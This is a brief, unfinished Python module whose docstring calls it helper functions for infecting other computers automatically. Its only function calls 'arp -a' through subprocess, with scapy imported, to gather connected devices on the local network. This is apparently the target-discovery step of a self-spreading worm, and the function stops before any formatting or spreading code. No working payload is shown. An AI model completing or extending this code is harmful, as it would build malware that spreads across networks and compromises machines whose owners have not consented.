"""Helper functions for infecting other computers automatically."""

import subprocess
import scapy.all as scapy


def FormatARPTable():
    connected = subprocess.getoutput(["arp","-a"])
    # uses arp (windows tool) to get all connected devices, but needs checking
    # below this comment is formatting code to format all stuff into list
